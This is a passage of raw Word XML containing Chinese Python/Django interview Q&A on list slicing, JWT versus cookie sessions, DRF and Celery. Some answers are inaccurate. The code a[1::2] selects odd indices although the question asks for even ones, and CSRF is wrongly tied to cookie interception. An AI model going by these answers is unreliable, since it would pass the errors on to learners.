        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的下标为偶数的元素进行加</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>后求和</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F31CDC1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">sum([i+3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> a[1::2]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0111F3B3" w14:textId="242D1155" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00E56594"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020</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对比说明</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>jwt</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>机制和</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cookie session</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>机制的优缺点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BEB83A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>cookie Session:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AE4444" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337DB6B7" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>简单方便，通用性好，可以存放敏感信息，可以灵活控制用户的状态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D749B8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7633FD5E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438C0425" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D87E92A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>扩展性: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A81DABA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1208D56A" w14:textId="6A730B35" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>这也意味着限制了应用的扩展能力。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EFFF5F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CSRF: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D24E4BC" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>jwt机制：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B67D8A4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EEC4F8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>不需要在服务端去保留用户的认证信息或者会话信息，减少服务器开销</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5807638A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E82924E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623386C3" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>已颁布分令牌无法主动让其失效（可以通过后端实现黑名单来实现，但其实黑名单的原理和cookie session其实</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581012C7" w14:textId="3DA1E05A" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>是一样的）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAD3455" w14:textId="11B7B14B"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02</w:t>
      </w:r>
      <w:r w:rsidR="00E56594">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>谈谈你对</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>drf</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的认识快速开发符合</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>restful</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>风格</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>接口的</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>扩展。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBD8B21" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>主要的核心组件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088F3A59" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>序列化器、视图、视图集，结合django自带的model和url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BE1523" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>使用drf其实已经不再符合django的mvt开发模式了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3DD162" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>主要的功能：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A966535" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>分页、限流、权限、认证等</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B74D5BE" w14:textId="42564126"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022</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的工作流程是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C38C52B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>celery架构由三个模块组成：消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F0F93C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>taskresult store）组成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F963AF4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>消息中间件（Broker）: 消息中间人，是任务调度队列，是一个独立的服务，是一个生产者消费者模式，生产者把任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01607969" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>放入队列中，消费者（worker）从任务队列中取出任务执行，任务的执行可以按照顺序依次执行也可以按照计划时间进行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1E71A8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>但是Broker本身不提供队列服务，所以要集成第三方队列，推荐使用RatbbitMQ或Redis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FB22EF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>任务执行单元（worker）：即执行任务的程序，可以有多个并发。它实时监控消息队列，获取队列中调度的任务，并执</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1477F53B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>行它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59079A12" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>任务执行结果存储（task result store）：由于任务的执行同主程序分开，如果主程序想获取任务执行的结果，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AE82E0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>就必须通过中间件存储。同消息中间人一样，存储也可以使用RabbitMQ、Redis；另外，假如不需要保存执行的结果也</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2503357A" w14:textId="6B3E7993" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>可以不配置这个模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072747AA" w14:textId="48804FF4" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B476713" wp14:editId="36AA40A9">
            <wp:extent cx="5962650" cy="260985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62650" cy="2609850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="399BDF31" w14:textId="02652FC6"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023</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中间件常用的</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>个方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCE38FD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
